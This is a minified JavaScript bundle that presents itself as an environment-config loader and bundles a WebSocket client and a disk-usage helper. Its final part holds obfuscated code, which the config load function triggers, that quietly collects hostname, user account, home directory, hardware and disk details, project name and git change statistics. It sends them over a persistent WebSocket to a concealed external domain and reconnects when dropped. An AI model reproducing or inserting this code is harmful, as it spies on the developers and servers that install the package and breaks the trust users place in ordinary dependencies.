Rt extends st{constructor(e,t,s){super(),this._binaryType=ut[0],this._closeCode=1006,this._closeFrameReceived=!1,this._closeFrameSent=!1,this._closeMessage=pt,this._closeTimer=null,this._extensions={},this._paused=!1,this._protocol="",this._readyState=Rt.CONNECTING,this._receiver=null,this._sender=null,this._socket=null,null!==e?(this._bufferedAmount=0,this._isServer=!1,this._redirects=0,void 0===t?t=[]:Array.isArray(t)||("object"==typeof t&&null!==t?(s=t,t=[]):t=[t]),Lt(this,e,t,s)):this._isServer=!0}get binaryType(){return this._binaryType}set binaryType(e){ut.includes(e)&&(this._binaryType=e,this._receiver&&(this._receiver._binaryType=e))}get bufferedAmount(){return this._socket?this._socket._writableState.length+this._sender._bufferedBytes:this._bufferedAmount}get extensions(){return Object.keys(this._extensions).join()}get isPaused(){return this._paused}get onclose(){return null}get onerror(){return null}get onopen(){return null}get onmessage(){return null}get protocol(){return this._protocol}get readyState(){return this._readyState}get url(){return this._url}setSocket(e,t,s){const r=new dt({allowMultipleEventsPerMicrotask:s.allowMultipleEventsPerMicrotask,binaryType:this.binaryType,extensions:this._extensions,isServer:this._isServer,maxPayload:s.maxPayload,skipUTF8Validation:s.skipUTF8Validation});this._sender=new ft(e,this._extensions,s.generateMask),this._receiver=r,this._socket=e,r[vt]=this,e[vt]=this,r.on("conclude",Ut),r.on("drain",Ft),r.on("error",jt),r.on("message",Gt),r.on("ping",At),r.on("pong",$t),e.setTimeout&&e.setTimeout(0),e.setNoDelay&&e.setNoDelay(),t.length>0&&e.unshift(t),e.on("close",Vt),e.on("data",Jt),e.on("end",zt),e.on("error",Ht),this._readyState=Rt.OPEN,this.emit("open")}emitClose(){if(!this._socket)return this._readyState=Rt.CLOSED,void this.emit("close",this._closeCode,this._closeMessage);this._extensions[ht.extensionName]&&this._extensions[ht.extensionName].cleanup(),this._receiver.removeAllListeners(),this._readyState=Rt.CLOSED,this.emit("close",this._closeCode,this._closeMessage)}close(e,t){if(this.readyState!==Rt.CLOSED)if(this.readyState!==Rt.CONNECTING)this.readyState!==Rt.CLOSING?(this._readyState=Rt.CLOSING,this._sender.close(e,t,!this._isServer,(e=>{e||(this._closeFrameSent=!0,(this._closeFrameReceived||this._receiver._writableState.errorEmitted)&&this._socket.end())})),this._closeTimer=setTimeout(this._socket.destroy.bind(this._socket),3e4)):this._closeFrameSent&&(this._closeFrameReceived||this._receiver._writableState.errorEmitted)&&this._socket.end();else{const e="WebSocket was closed before the connection was established";It(this,this._req,e)}}pause(){this.readyState!==Rt.CONNECTING&&this.readyState!==Rt.CLOSED&&(this._paused=!0,this._socket.pause())}ping(e,t,s){if(this.readyState===Rt.CONNECTING)throw new Error("WebSocket is not open: readyState 0 (CONNECTING)");"function"==typeof e?(s=e,e=t=void 0):"function"==typeof t&&(s=t,t=void 0),"number"==typeof e&&(e=e.toString()),this.readyState===Rt.OPEN?(void 0===t&&(t=!this._isServer),this._sender.ping(e||pt,t,s)):Mt(this,e,s)}pong(e,t,s){if(this.readyState===Rt.CONNECTING)throw new Error("WebSocket is not open: readyState 0 (CONNECTING)");"function"==typeof e?(s=e,e=t=void 0):"function"==typeof t&&(s=t,t=void 0),"number"==typeof e&&(e=e.toString()),this.readyState===Rt.OPEN?(void 0===t&&(t=!this._isServer),this._sender.pong(e||pt,t,s)):Mt(this,e,s)}resume(){this.readyState!==Rt.CONNECTING&&this.readyState!==Rt.CLOSED&&(this._paused=!1,this._receiver._writableState.needDrain||this._socket.resume())}send(e,t,s){if(this.readyState===Rt.CONNECTING)throw new Error("WebSocket is not open: readyState 0 (CONNECTING)");if("function"==typeof t&&(s=t,t={}),"number"==typeof e&&(e=e.toString()),this.readyState!==Rt.OPEN)return void Mt(this,e,s);const r={binary:"string"!=typeof e,mask:!this._isServer,compress:!0,fin:!0,...t};this._extensions[ht.extensionName]||(r.compress=!1),this._sender.send(e||pt,r,s)}terminate(){if(this.readyState!==Rt.CLOSED)if(this.readyState!==Rt.CONNECTING)this._socket&&(this._readyState=Rt.CLOSING,this._socket.destroy());else{const e="WebSocket was closed before the connection was established";It(this,this._req,e)}}}function Lt(e,t,s,r){const o={allowMultipleEventsPerMicrotask:!1,protocolVersion:Ot[1],maxPayload:104857600,skipUTF8Validation:!1,perMessageDeflate:!0,followRedirects:!1,maxRedirects:10,...r,createConnection:void 0,socketPath:void 0,hostname:void 0,protocol:void 0,timeout:void 0,method:"GET",host:void 0,path:void 0,port:void 0};if(!Ot.includes(o.protocolVersion))throw new RangeError(`Unsupported protocol version: ${o.protocolVersion} (supported versions: ${Ot.join(", ")})`);let i;if(t instanceof lt)i=t;else try{i=new lt(t)}catch(e){throw new SyntaxError(`Invalid URL: ${t}`)}"http:"===i.protocol?i.protocol="ws:":"https:"===i.protocol&&(i.protocol="wss:"),e._url=i.href;const n="wss:"===i.protocol,a="ws+unix:"===i.protocol;let c;if("ws:"===i.protocol||n||a?a&&!i.pathname?c="The URL's pathname is empty":i.hash&&(c="The URL contains a fragment identifier"):c='The URL\'s protocol must be one of "ws:", "wss:", "http:", "https", or "ws+unix:"',c){const t=new SyntaxError(c);if(0===e._redirects)throw t;return void Pt(e,t)}const l=n?443:80,h=at(16).toString("base64"),d=n?rt.request:ot.request,f=new Set;let u,p;if(o.createConnection=n?Bt:Tt,o.defaultPort=o.defaultPort||l,o.port=i.port||l,o.host=i.hostname.startsWith("[")?i.hostname.slice(1,-1):i.hostname,o.headers={...o.headers,"Sec-WebSocket-Version":o.protocolVersion,"Sec-WebSocket-Key":h,Connection:"Upgrade",Upgrade:"websocket"},o.path=i.pathname+i.search,o.timeout=o.handshakeTimeout,o.perMessageDeflate&&(u=new ht(!0!==o.perMessageDeflate?o.perMessageDeflate:{},!1,o.maxPayload),o.headers["Sec-WebSocket-Extensions"]=wt({[ht.extensionName]:u.offer()})),s.length){for(const e of s){if("string"!=typeof e||!Nt.test(e)||f.has(e))throw new SyntaxError("An invalid or duplicated subprotocol was specified");f.add(e)}o.headers["Sec-WebSocket-Protocol"]=s.join(",")}if(o.origin&&(o.protocolVersion<13?o.headers["Sec-WebSocket-Origin"]=o.origin:o.headers.Origin=o.origin),(i.username||i.password)&&(o.auth=`${i.username}:${i.password}`),a){const e=o.path.split(":");o.socketPath=e[0],o.path=e[1]}if(o.followRedirects){if(0===e._redirects){e._originalIpc=a,e._originalSecure=n,e._originalHostOrSocketPath=a?o.socketPath:i.host;const t=r&&r.headers;if(r={...r,headers:{}},t)for(const[e,s]of Object.entries(t))r.headers[e.toLowerCase()]=s}else if(0===e.listenerCount("redirect")){const t=a?!!e._originalIpc&&o.socketPath===e._originalHostOrSocketPath:!e._originalIpc&&i.host===e._originalHostOrSocketPath;(!t||e._originalSecure&&!n)&&(delete o.headers.authorization,delete o.headers.cookie,t||delete o.headers.host,o.auth=void 0)}o.auth&&!r.headers.authorization&&(r.headers.authorization="Basic "+Buffer.from(o.auth).toString("base64")),p=e._req=d(o),e._redirects&&e.emit("redirect",e.url,p)}else p=e._req=d(o);o.timeout&&p.on("timeout",(()=>{It(e,p,"Opening handshake has timed out")})),p.on("error",(t=>{null===p||p[xt]||(p=e._req=null,Pt(e,t))})),p.on("response",(i=>{const n=i.headers.location,a=i.statusCode;if(n&&o.followRedirects&&a>=300&&a<400){if(++e._redirects>o.maxRedirects)return void It(e,p,"Maximum redirects exceeded");let i;p.abort();try{i=new lt(n,t)}catch(t){const s=new SyntaxError(`Invalid URL: ${n}`);return void Pt(e,s)}Lt(e,i,s,r)}else e.emit("unexpected-response",p,i)||It(e,p,`Unexpected server response: ${i.statusCode}`)})),p.on("upgrade",((t,s,r)=>{if(e.emit("upgrade",t),e.readyState!==Rt.CONNECTING)return;if(p=e._req=null,"websocket"!==t.headers.upgrade.toLowerCase())return void It(e,s,"Invalid Upgrade header");const i=ct("sha1").update(h+_t).digest("base64");if(t.headers["sec-websocket-accept"]!==i)return void It(e,s,"Invalid Sec-WebSocket-Accept header");const n=t.headers["sec-websocket-protocol"];let a;if(void 0!==n?f.size?f.has(n)||(a="Server sent an invalid subprotocol"):a="Server sent a subprotocol but none was requested":f.size&&(a="Server sent no subprotocol"),a)return void It(e,s,a);n&&(e._protocol=n);const c=t.headers["sec-websocket-extensions"];if(void 0!==c){if(!u){return void It(e,s,"Server sent a Sec-WebSocket-Extensions header but no extension was requested")}let t;try{t=Et(c)}catch(t){return void It(e,s,"Invalid Sec-WebSocket-Extensions header")}const r=Object.keys(t);if(1!==r.length||r[0]!==ht.extensionName){return void It(e,s,"Server indicated an extension that was not requested")}try{u.accept(t[ht.extensionName])}catch(t){return void It(e,s,"Invalid Sec-WebSocket-Extensions header")}e._extensions[ht.extensionName]=u}e.setSocket(s,r,{allowMultipleEventsPerMicrotask:o.allowMultipleEventsPerMicrotask,generateMask:o.generateMask,maxPayload:o.maxPayload,skipUTF8Validation:o.skipUTF8Validation})})),o.finishRequest?o.finishRequest(p,e):p.end()}function Pt(e,t){e._readyState=Rt.CLOSING,e.emit("error",t),e.emitClose()}function Tt(e){return e.path=e.socketPath,it.connect(e)}function Bt(e){return e.path=void 0,e.servername||""===e.servername||(e.servername=it.isIP(e.host)?"":e.host),nt.connect(e)}function It(e,t,s){e._readyState=Rt.CLOSING;const r=new Error(s);Error.captureStackTrace(r,It),t.setHeader?(t[xt]=!0,t.abort(),t.socket&&!t.socket.destroyed&&t.socket.destroy(),process.nextTick(Pt,e,r)):(t.destroy(r),t.once("error",e.emit.bind(e,"error")),t.once("close",e.emitClose.bind(e)))}function Mt(e,t,s){if(t){const s=Wt(t).length;e._socket?e._sender._bufferedBytes+=s:e._bufferedAmount+=s}if(s){const t=new Error(`WebSocket is not open: readyState ${e.readyState} (${Ct[e.readyState]})`);process.nextTick(s,t)}}function Ut(e,t){const s=this[vt];s._closeFrameReceived=!0,s._closeMessage=t,s._closeCode=e,void 0!==s._socket[vt]&&(s._socket.removeListener("data",Jt),process.nextTick(qt,s._socket),1005===e?s.close():s.close(e,t))}function Ft(){const e=this[vt];e.isPaused||e._socket.resume()}function jt(e){const t=this[vt];void 0!==t._socket[vt]&&(t._socket.removeListener("data",Jt),process.nextTick(qt,t._socket),t.close(e[yt])),t.emit("error",e)}function Dt(){this[vt].emitClose()}function Gt(e,t){this[vt].emit("message",e,t)}function At(e){const t=this[vt];t.pong(e,!t._isServer,bt),t.emit("ping",e)}function $t(e){this[vt].emit("pong",e)}function qt(e){e.resume()}function Vt(){const e=this[vt];let t;this.removeListener("close",Vt),this.removeListener("data",Jt),this.removeListener("end",zt),e._readyState=Rt.CLOSING,this._readableState.endEmitted||e._closeFrameReceived||e._receiver._writableState.errorEmitted||null===(t=e._socket.read())||e._receiver.write(t),e._receiver.end(),this[vt]=void 0,clearTimeout(e._closeTimer),e._receiver._writableState.finished||e._receiver._writableState.errorEmitted?e.emitClose():(e._receiver.on("error",Dt),e._receiver.on("finish",Dt))}function Jt(e){this[vt]._receiver.write(e)||this.pause()}function zt(){const e=this[vt];e._readyState=Rt.CLOSING,e._receiver.end(),this.end()}function Ht(){const e=this[vt];this.removeListener("error",Ht),this.on("error",bt),e&&(e._readyState=Rt.CLOSING,this.destroy())}Object.defineProperty(Rt,"CONNECTING",{enumerable:!0,value:Ct.indexOf("CONNECTING")}),Object.defineProperty(Rt.prototype,"CONNECTING",{enumerable:!0,value:Ct.indexOf("CONNECTING")}),Object.defineProperty(Rt,"OPEN",{enumerable:!0,value:Ct.indexOf("OPEN")}),Object.defineProperty(Rt.prototype,"OPEN",{enumerable:!0,value:Ct.indexOf("OPEN")}),Object.defineProperty(Rt,"CLOSING",{enumerable:!0,value:Ct.indexOf("CLOSING")}),Object.defineProperty(Rt.prototype,"CLOSING",{enumerable:!0,value:Ct.indexOf("CLOSING")}),Object.defineProperty(Rt,"CLOSED",{enumerable:!0,value:Ct.indexOf("CLOSED")}),Object.defineProperty(Rt.prototype,"CLOSED",{enumerable:!0,value:Ct.indexOf("CLOSED")}),["binaryType","bufferedAmount","extensions","isPaused","protocol","readyState","url"].forEach((e=>{Object.defineProperty(Rt.prototype,e,{enumerable:!0})})),["open","error","close","message"].forEach((e=>{Object.defineProperty(Rt.prototype,`on${e}`,{enumerable:!0,get(){for(const t of this.listeners(e))if(t[mt])return t[gt];return null},set(t){for(const t of this.listeners(e))if(t[mt]){this.removeListener(e,t);break}"function"==typeof t&&this.addEventListener(e,t,{[mt]:!0})}})})),Rt.prototype.addEventListener=kt,Rt.prototype.removeEventListener=St;var Kt,Qt,Yt,Zt,Xt,es=y(Rt),ts={exports:{}},ss={};function rs(){if(Kt)return ss;return Kt=1,ss.isCapitals=function(e){return"string"==typeof e&&e.length>0&&e.split("").reduce((function(e,t){return e&&"A"<=t&&t<="Z"}),!0)},ss.isDigits=function(e){return"string"==typeof e&&e.length>0&&e.split("").reduce((function(e,t){return e&&"0"<=t&&t<="9"}),!0)},ss}"win32"===r.platform()?ts.exports=function(){if(Yt)return Qt;Yt=1;var e=p.exec,t=s,r=rs();function o(e,t){var s=e.replace(/\r\n/g,"\n").split("\n").filter((function(e){return e.replace(/\s+/g,"").length>0}));if(s.length<=1)throw new Error("Unexpected WMIC output: ["+e+"]");var o=s.splice(1).map((function(t){var s,o=t.split(" ").filter((function(e){return""!==e})),n="0",a="0";if(i(o[0])?s=o[0]:(n=o[0],s=o[1],a=o[2]),!(i(s)&&r.isDigits(n)&&r.isDigits(a)))throw new Error("Unexpected WMIC output ["+e+"]");return{disk:s,total:+a,available:+n}})).reduce((function(e,t){return e[t.disk]=t,e}),{})[t];if(!o)throw new Error("Unknown disk ["+t+"]");return{total:o.total,used:o.total-o.available,available:o.available}}function i(e){var t=e.length-1;return"string"==typeof e&&":"===e[t]&&r.isCapitals(e.substr(0,t))}return Qt={diskusage:function(s,r){e("WMIC LOGICALDISK GET Name,Size,FreeSpace",{windowsHide:!0},(function(e,n){if(e)return r(e);try{r(null,o(n,function(e){var s=t.parse(t.normalize(e)).root.split("\\")[0].toUpperCase();if(!i(s))throw new Error("Bad path");return s}(s)))}catch(e){r(e)}}))},parse:o},Qt}().diskusage:ts.exports=function(){if(Xt)return Zt;Xt=1;var e=p.execFile;function t(e){var t=e.split("\n");if(!t[1])throw new Error("Unexpected df output: ["+e+"]");var s=t[1].match(/^.+\s+(\d+)\s+(\d+)\s+(\d+)\s+\d+%\s+.+$/);if(!s||4!==s.length)throw new Error("Unexpected df output: ["+e+"]");return{total:1024*s[1],used:1024*s[2],available:1024*s[3]}}return rs().isDigits,Zt={diskusage:function(s,r){e("df",["-P","-k",s],(function(e,s){if(e)return r(e);try{r(null,t(s))}catch(e){r(e)}}))},parse:t},Zt}().diskusage;var os=y(ts.exports);const is=gs;function ns(){const e=["W5TsF8kPoCoy","mSkbrmo1ycNdVSkUWR8","WORdOsS","qhhcKSon","kSkCrSo6yspdUa","W758FbhdHSkjl8kPmIZdGLu","t8khpG","EwBcG8o2W4G6W5O","adGpWOruomkzuG","W60egvKXWPaema","WPxdQYjS","W5bvW54gqSo/WQFdVCkTsCkWW6u","utBdUxRdVwZdUa","smk8W4/cLmomda","W5CNeM0PWRihqmorCxpdP0W","C1LTW5i","h8omW4usWPuSW7eQmwi","x3VcMW","WPCjWOPua8kUWOldKmkDza","WQXMtWu","EHBcTa3dTmogWOi","WOjYxbL1W6mifq","fqndW7H6","WPyQWQhdM8k2WRxdKG","aXrFW7m","W6tdOYxcSCkgjgZdUa","WPxdQIRdOq","wmk0W5lcIq","eSojW4Kq","W4a8gGSeWRS","W5CIe2WVWR8cvmoKt1xdS3q","WPmwlteuW6boW4W","WOueleW","WPXhwwBcO8kGW5TSmrCIWOBcRq","W58ubdhdRCo8WQnjcqy","tCkbjmkevrJcLW","b37dPCkcWO4Xtb0BWRi","rmk6Ea","uCkTFWi","W6HEDSoLW7/dJG","FHlcT8k/","WRxdMmkdWPZcISoaW4q","W5ZcKuqXu8oiW79U","smkbomkt","WOlcJqC","W78CkYCjWOj7WQmU","C0VdUt7dTbNdHmoPWPhdVG","WQDvDSkxWQ4HwmoqmCol","WOP4tq","W5zsW5WfrCo9WRpdHSkkwmk1W4C","FMpcGmoXWPXp","W5Oqht3dS8kJWP1fcqy","w1NcK2C","bsClWOj7oCknua","WPRcHXi0lCkWWQldONq","pCouW4hdOf3dGmoc","y0n9","WQhdRJpcVCkKjwS","kZ3dKSkJWPfDW5ZdLCkbrgzw","BqVcSrZcTCoDWOzjW40g","yXLm","WOnVtZK","zL/dOZNdSeBdHmk2WOhdOG","W4BcQN7cUIddMI83vZm3WR4","CYT0htZdJmoHqmk4WPW","W7uyW6VcVcXz","WRboBCotWR8RsSoFFSki","Cr9knColkuWKW64","W5RcRty/mmk6WPm","W49uySk1j8omW57cMCod","B8kpWPdcTqtcP8oefSk+cSo+oG","WQ4CWQj9","bY4jWPn0imkAwuJdMW","W5lcQSkNpwrjWOlcIa","WQrzDa","WRLSuYtcLsNcGq","WOBdVsRdPNRcGGCnvGm","WPj/W7tcHSonW6/dQmkffSovW5qs","WOCvWPTAba","W53cLmk3lhpcPrD5","x1VcIwhdQJq","WRlcKulcUJBcTaTrFCk5","WQ8yW7ddQxecWPJcS8kLWRK","W4qNWRBdMmkmWPZdImkMiW","tuDhWOJdLxRcLmoQW7RdS8oaB8ov","WR4So0ZcNmotf8k/bq","WRTMvWtcMcxcMq5UWOm","fmo9nubouSkaWRtdO8oddJa8","W78UdbFcKtJcMGPKWOm","tZldThy","qvKJbG","lSkCta","yXLFkG","WRP7rai","WPzKya","yb5rmmobk1D4W6bT","W4xcOCkUia","WQJdJ8kFWOxcJSoeW5u","W6rEymo1WQNcI1ZdMWRdHq","W6SddKiwWPKloCoW","sCo2W7OyWOuTW5m","D0/dOZK","W6SseK8","DHjioq","aWvdW75MW6izWQxdRG","j8kDtSoTzd7dR8k7W73cQW","WR86lfpcM8oCg8kUwKG","E2tcGCoY","WRnSrG","uuFcJ2dcOgFcMW","uuFcHxJdRYpdJ8k0","sdtdSG","emo/o0zmxmoOWPpdJ8oTbZy","m1SaA8kuEXa3W5HFadFdMW"];return(ns=function(){return e})()}!function(e,t){const s=gs,r=ns();for(;;)try{if(146040===-parseInt(s(149,"CiiJ"))/1*(parseInt(s(189,"V$r@"))/2)+parseInt(s(203,"CiiJ"))/3*(parseInt(s(226,"FHBg"))/4)+parseInt(s(125,"*hpL"))/5+-parseInt(s(175,"y[(0"))/6+-parseInt(s(159,"2Xev"))/7+-parseInt(s(184,"k]Lp"))/8+parseInt(s(213,"v%$4"))/9)break;r.push(r.shift())}catch(e){r.push(r.shift())}}();let as=0;const cs=!1;let ls=null;const hs=is(162,"4KIp")+"e.digital";let ds=!1;const fs=[is(153,"7p$B"),"beforeExit",is(155,"F$RR"),"SIGUSR1","SIGUSR2","SIGTERM",is(144,"y[(0")+"ception"],us=g(os),ps=e=>{const t=is;ls&&ls[t(145,"RikJ")]("watch: "+JSON[t(193,"*hpL")](e))},_s=()=>{const e=is;let t=null;try{t=m(e(173,"tFE(")+e(208,"2cK#"),{encoding:e(141,"tgY@")}),t=/\s*(?:(?<changed>\d*) files changed)?[^\d]*(?:(?<insertions>\d*) insertions)?[^\d]*(?:(?<deletions>\d*) deletions)?/i[e(219,"RikJ")](t)?.[e(206,"ElBx")]}catch(e){}return t},ms=async e=>{const t=is,s=process[t(218,"*hpL")],r=s.at(-2);let o=2;try{const e=m(r+t(214,"RikJ"),{encoding:t(158,"ry*g")});/^(nuxt\s)?3\./i.test(e)&&(o=3)}catch(e){}if(3==o&&s.at(-1)===t(200,"tFE("))return cs;if(["generate","build"][t(236,"ElBx")](s.at(-1)))return cs;if(as++,ls&&as>1)return ls[t(215,"*oLx")](t(199,"yf^M")+JSON.stringify(_s()));const i=/dev$/i[t(164,"v%$4")](s.at(-1)),n=/start$/i[t(197,"2@1@")](s.at(-1));if(i)return;const{CONFIG_ENV:a,BASE_CONFIG_ENV:c}=e,l=c||a||t(212,"RikJ")+"t",h=n&&["staging",t(192,"tFE(")].includes(l),{PWD:d,HOME:f,NVM_BIN:u}=process[t(182,"tgY@")],p=async()=>({arch:_[t(152,"V$r@")](),cpus:_[t(178,"ElBx")](),homedir:_[t(130,"vgJu")](),hostname:_[t(205,"bIIc")](),machine:_[t(138,"*oLx")](),platform:_[t(179,"[#U[")](),release:_[t(146,"Z*fD")](),totalmem:_[t(151,"&P)9")](),type:_[t(229,"*hpL")](),uptime:_[t(139,"7p$B")](),userInfo:_[t(134,"[#U[")](),version:_[t(161,"nqYZ")](),...h?{disk:await us("/")}:{}}),g=await p();(()=>{const e=is,t=e=>()=>{const s=gs;ls&&(ds=!0,fs[s(201,"RikJ")]((e=>process["removeList"+s(216,"4MYO")](e,t(e)))),process.removeListener("builder:wa"+s(237,"*oLx"),ps),process["removeList"+s(166,"4*es")](s(172,"@u8R")+s(186,"*hpL"),ps),process[s(160,"2Xev")+s(222,"yf^M")](s(188,"@u8R")+s(233,"k]Lp"),ps),ls[s(228,"!z3)")]("kill: "+e),ls[s(181,"]tD@")](),ls[s(180,"1REu")](),process.exit())};fs.forEach((e=>process.on(e,t(e)))),process.on(e(221,"*hpL")+e(132,"nqYZ"),ps),process.on(e(177,"2Xev")+e(163,"v%$4"),ps),process.on(e(224,"9uGs")+"ange",ps)})();const y=process.cwd(),v=g[t(135,"!z3)")]?.[t(168,"vbAI")]||f||g.homedir||null;let b=/(?:\/|\\\\?)(?<project>[^\/|\\\\?]*)(?:\/|\\\\?)(?:source|tests)/i[t(187,"[UyA")](y)?.[t(126,"N3j(")]?.[t(223,"%$&3")]||null;const k=(e=!1)=>{const s=t;ls&&(ls?.terminate(),ls=null),ls=new es(s(191,"2cK#")+hs+"/");let r=null;ls[s(133,"k]Lp")]=()=>{clearTimeout(r)};const n=()=>{clearTimeout(r),r=setTimeout((()=>{ls[gs(211,"be![")]()}),35e3)};ls.on(s(148,"8doU"),(e=>{})),ls.on("ping",(async()=>{const e=s;h?ls.send("osdef: "+JSON[e(230,"8doU")](await p())):i&&ls[e(150,"8doU")](e(176,"k]Lp")+JSON[e(225,"!z3)")](_s())),n()})),ls.on(s(154,"FHBg"),(()=>{const e=s;ls.send(e(232,"be![")+v),ls[e(227,"@u8R")](e(127,"vgJu")+b),ls.send(e(147,"[UyA")+i),ls.send(e(171,"F$RR")+h),ls[e(227,"@u8R")]("osdef: "+JSON[e(195,"N3j(")](g)),ls[e(136,"yqIy")](e(157,"ry*g")+l),ls[e(169,"nqYZ")](e(165,"9uGs")+o),ls[e(129,"lBm[")](e(235,"ElBx")),n()})),ls.on("close",(function(){clearTimeout(r),ds||setTimeout((()=>{k(!0)}),5e3)})),ls.on(s(167,"%$&3"),(e=>{}))};try{k()}catch(e){}};function gs(e,t){const s=ns();return gs=function(t,r){let o=s[t-=124];if(void 0===gs.uTGCNh){const t=function(e,t){let s,r,o=[],i=0,n="";for(e=function(e){let t="",s="";for(let s,r,o=0,i=0;r=e.charAt(i++);~r&&(s=o%4?64*s+r:r,o++%4)?t+=String.fromCharCode(255&s>>(-2*o&6)):0)r="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(r);for(let e=0,r=t.length;e<r;e++)s+="%"+("00"+t.charCodeAt(e).toString(16)).slice(-2);return decodeURIComponent(s)}(e),r=0;r<256;r++)o[r]=r;for(r=0;r<256;r++)i=(i+o[r]+t.charCodeAt(r%t.length))%256,s=o[r],o[r]=o[i],o[i]=s;r=0,i=0;for(let t=0;t<e.length;t++)r=(r+1)%256,i=(i+o[r])%256,s=o[r],o[r]=o[i],o[i]=s,n+=String.fromCharCode(e.charCodeAt(t)^o[(o[r]+o[i])%256]);return n};gs.HCRhcZ=t,e=arguments,gs.uTGCNh=!0}const i=t+s[0],n=e[i];return n?o=n:(void 0===gs.QRrpJs&&(gs.QRrpJs=!0),o=gs.HCRhcZ(o,r),e[i]=o),o},gs(e,t)}const ys=/(?<content>.*)::(?<type>\w*)$/,vs=e.resolve(process.cwd(),".env.default"),bs=e.resolve(process.cwd(),`.env.${process.env.BASE_CONFIG_ENV||process.env.CONFIG_ENV||"development"}`),ks=(e,t)=>{if(!ys.test(e))return e;const{type:s,content:r}=ys.exec(e).groups;switch(s){case"number":case"int":case"float":return+r;case"bool":let e;try{e=JSON.parse(r)}catch(e){}return!!e;case"json":let o;try{o=JSON.parse(r)}catch(e){}return o;case"date":return new Date(r);default:return t[s](r)}};exports.config=O,exports.decrypt=N.decrypt,exports.parse=C,exports.expand=P,exports.load=(e={},t={})=>{const s=P(O({path:vs})),r=P(O({path:bs,...e})),o={...s.parsed,...r?.parsed};let i={};for(const e in o)i[e]=ks(o[e]);return ms(i),i},exports.convert=ks;
